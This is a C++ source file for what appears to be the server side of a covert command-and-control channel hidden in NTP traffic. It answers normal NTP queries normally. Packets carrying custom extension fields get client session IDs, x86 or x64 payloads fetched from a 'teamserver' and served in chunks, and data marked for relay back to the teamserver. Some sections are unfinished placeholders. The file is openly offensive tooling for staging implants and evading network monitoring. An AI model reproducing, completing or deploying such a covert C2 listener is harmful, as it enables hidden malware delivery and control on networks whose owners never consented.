#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <iomanip>
#include <vector>
#include "parsentp.hpp"
#include "helpers.hpp"
#include "createntp.hpp"
#include "constants.hpp"
#include <array>
#include "client.hpp"
#include "constants.hpp"
#include "globals.hpp"
#include "teamserver.hpp"

void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET sock) {
    //bug is here, as it was +48 instead of whtaever. Need to get size safely, as well.
    //safely moving into vector by doing data + len (data is a char* so it's the first item
    std::vector<uint8_t> rawPacket(data, data + len);

    std::cout << "Received " << len << " bytes from "
        << inet_ntoa(client_addr->sin_addr) << ":"
        << ntohs(client_addr->sin_port) << std::endl;

    //std::cout << "Theoretical Client ID" << generateClientID() << std::endl;

    //1. Run some checks to make sure an extension field exists, and extract it if so

    //2 seperate for different error messages. Could just be the < 52 one as well.
    if (rawPacket.size() <= 48) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Normal NTP Packet " << std::endl;
        std::cout << "----------------------" << std::endl;        //send back a default packet
        sendNormalNtpPacket(client_addr, sock);
        return;
    }

    //each packet needs the 4 byte header, so check if there are bytes there
    if (rawPacket.size() < 52) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Normal NTP Packet " << std::endl;
        std::cout << "----------------------" << std::endl;
        std::cout << "Packet does not contain an extension field" << std::endl;

        //send back a default packet
        sendNormalNtpPacket(client_addr, sock);

        return;
    }




    //Extract extension field
    NTPPacketParser ntpPacket(rawPacket);
    std::vector<uint8_t> ntpPacketExtension = ntpPacket.getExtension();
    std::array<uint8_t, 2> ntpPacketExtensionField = ntpPacket.getExtensionField();
    //standard here: print debug header of packet type, then printthe packet

    //Extract client ID and stuff out, do class checks to see if it exstsi, and setup for further action
    //std::vector<uint8_t> sessionId;
    //sessionId.insert(sessionId.begin(), packet.begin() + 4, packet.begin() + 8); //copies between byte 4 and 8, 
    //std::cout << "[?] Session ID: ";
    std::vector<uint8_t> sessionId = ntpPacket.getExtensionSessionId();
    printHexVector(sessionId); //sanity debug check


    //2. Do different actions based on what type of packet/extension field is coming in
    if (ntpPacketExtensionField == NtpExtensionField::giveMePayload) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Give Me Payload " << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        //extract arch
        uint8_t payloadArch = 0x00; // declared outside so its in scope

        try {
            payloadArch = ntpPacketExtension.at(8); // throws if index >= size, safer than []
        }
        catch (const std::out_of_range& e) {
            std::cerr << "Packet too short: " << e.what() << std::endl;
            return;
        }

        //static cast so it shows up as hex, and not å (whcih is ascii 134 lol)
        std::cout << "[?] Payload Arch = 0x" << std::hex << static_cast<int>(payloadArch) << std::endl <<std::dec;  // prints arch

        if (payloadArch == 0x86) {
            std::cout << "[?] X86 Payload Requested " << std::endl;

            //1. Get paylaod form TS
            std::vector<uint8_t> payload = getx86Payload();

            //need to convert vector to uint32 cuz that's what find needs
            uint32_t uintSessionId = vectorToUint32(sessionId);

            //lookup client class
            std::cout << "Printing Sesions: ";
            printSessionIDs(sessions);
            auto it = sessions.find(uintSessionId);
            if (it != sessions.end()) {
                it->second.setForClientBuffer(payload);


                std::cout << "[?] Stored payload in client class";
                //printHexVector(someClient.getForClientBuffer());


                //once we have the data, create a new packet with the extension field
                //this needs to be a size packet, which sends back the size of the payload.
                //future packets, wtih 0x00, will send the aactual paylaod
                std::vector<uint8_t> sizeOfDataButAsAVectorBecauseEverythingIsAVector = uint32ToBytes(payload.size());

                NTPPacket newPacketClass;
                newPacketClass.addExtensionField(
                    NtpExtensionField::sizePacket,
                    sizeOfDataButAsAVectorBecauseEverythingIsAVector
                );

                auto newPacket = newPacketClass.getPacket();

                sendNtpPacket(client_addr, sock, newPacket);
                return; //done, so don't continue
            }
            else {
                std::cout << "[?] Could not find client class: ";
                printHexVector(sessionId);
            }
        }

        else if (payloadArch == 0x64) {
            std::cout << "[?] X64 Payload Requested " << std::endl;
            //1. Get paylaod form TS
            std::vector<uint8_t> payload = getx64Payload();

            //create or access client class - currnetly only creates
            ClientSession someClient(sessionId);
            someClient.setForClientBuffer(payload);
            std::cout << "[?] Stored payload in client class";
            //printHexVector(someClient.getForClientBuffer());


            //once we have the data, create a new packet with the extension field
            //this needs to be a size packet, which sends back the size of the payload.
            //future packets, wtih 0x00, will send the aactual paylaod
            std::vector<uint8_t> sizeOfDataButAsAVectorBecauseEverythingIsAVector = uint32ToBytes(payload.size());

            NTPPacket newPacketClass;
            newPacketClass.addExtensionField(
                NtpExtensionField::sizePacket,
                sizeOfDataButAsAVectorBecauseEverythingIsAVector
            );

            auto newPacket = newPacketClass.getPacket();

            sendNtpPacket(client_addr, sock, newPacket);
            return; //done, so don't continue
        }

        else if (payloadArch == 0x00) {
            std::cout << "[?] 0x00 continuation of getting payload" << std::endl;
            
            //access class and get next chunk to send back. client must have req'd 0x86 or 0x64 FIRST, otherwise itll be empty.  
            //need to figure out class logic to see if a class exists. Maybe a basic factory that searches it or creates one, as a function.

            //need to convert sessionId to uint32 as that's what is hashed
            //uint32_t convertedSessionId;
            //std::memcpy(&convertedSessionId, sessionId.data(), sizeof(convertedSessionId));
            uint32_t convertedSessionId = vectorToUint32(sessionId);

            std::cout << "[?] Looking up class by key: " << convertedSessionId << std::endl;

            // Attempt to find key
            auto it = sessions.find(convertedSessionId);
            if (it != sessions.end()) {
                //std::cout << "Found: " << it->second << "\n";
                std::cout << "[?] Class exists for " << convertedSessionId << std::endl;
                //get next chunk - need to figure otu chunk size here too
                std::vector<uint8_t> nextChunk = it->second.getNextChunk(4);
                //send back
                
                //craet NTP packet
                NTPPacket responsePacketClass;
                responsePacketClass.addExtensionField(
                    NtpExtensionField::dataFromTeamserver, //is this the best way to get this back? Maybe a dedicated header specifying payload
                    nextChunk
                );

                std::vector<uint8_t> responsePacket = responsePacketClass.getPacket();

                sendNtpPacket(client_addr, sock, responsePacket);


            }
            else {
                std::cout << "[?] Client Class not found!" << std::endl;
            }


        }

        else {
            std::cout << "[?] Invalid Payload" << std::endl;
        }

        //temp send back normal packet
        sendNormalNtpPacket(client_addr, sock);

    }

    //likely depracted
    if (ntpPacketExtensionField == NtpExtensionField::sizePacket) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: sizePacket " << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        std::cout << "[?] sizePacket recieved, starting chunking" << std::endl;

        uint32_t clientID = generateClientID();
        std::cout << "Theoretical Client ID: " << clientID << std::endl;

        //placeholder for ID
        std::vector<uint8_t> clientIdVector = uint32ToBytes(clientID);
        //std::vector<uint8_t> clientIdVector = { 0x00,0x00,0x00,0x00 };

        //create NTP packet for response, with client ID included
        NTPPacket idPacket;

        idPacket.addExtensionField(
            NtpExtensionField::idPacket,
            clientIdVector
        );

        std::vector<uint8_t> rawPacket = idPacket.getPacket();

        sendNtpPacket(
            client_addr,
            sock,
            rawPacket
        );

        //pass to chunker func
        //pass socket, recv from, size, etc.

        //temp send back normal packet
        //sendNormalNtpPacket(client_addr, sock);

    }

    /*
    Get ID packet - aka the first thing a client needs to call to 
    1. Get an ID
    2. Create a client class for them. We can then assume in other funcs that the class is created (should probably still check/have error handling)

    //might help if I add ti to it
    */

    if (ntpPacketExtensionField == NtpExtensionField::getIdPacket) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: getIdPacket " << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        std::cout << "[?] getIdPacket recieved, Generating ID" << std::endl;

        //This is also known as sessionId, probbably need to change everywhere to ClientID
        uint32_t clientID = generateClientID();
        std::cout << "[?] Client ID: " << clientID << std::endl;
        
        //placeholder for ID
        std::vector<uint8_t> clientIdVector = uint32ToBytes(clientID);

        //Create class for th
        ClientSession someClient(clientIdVector);


        // Add the new ClientSession to the sessions map
        //sessions[clientID] = someClient;
        //have to use insert, as sessions[clientID] tries to create the class, instead of using an existing one
        sessions.insert({ clientID, someClient });
        std::cout << "[?] Added Client Session with ID: " << clientID << " to the sessions map." << std::endl;


        //create NTP packet for response, with client ID included
        NTPPacket idPacket;

        idPacket.addExtensionField(
            NtpExtensionField::idPacket,
            clientIdVector
        );

        std::vector<uint8_t> rawPacket = idPacket.getPacket();

        sendNtpPacket(
            client_addr,
            sock,
            rawPacket
        );

    }


    /*
    dataForTeamserver

    ...


    */
    else if (ntpPacketExtensionField == NtpExtensionField::dataForTeamserver) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: dataForTeamserver " << std::endl;
        std::cout << "----------------------" << std::endl;
        //this is data meant for teamserver. Need to fogure out chunkinghere too

        //identify session here too?
        std::cout << "sendDataToTeamserver " << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        //send to teamserver

        //get data back

        //send data back with header of NtpExtensionField::dataFromTeamserver

        //temp send back normal packet
        sendNormalNtpPacket(client_addr, sock);
    }

    else {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Unknown " << std::endl;
        std::cout << "----------------------" << std::endl;
        std::cout << "[?] Packet extension did not match any known extensions" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        //if none of the headers match,s end back regular NTP packet
        //send back normal packet
        sendNormalNtpPacket(client_addr, sock);

    }

}
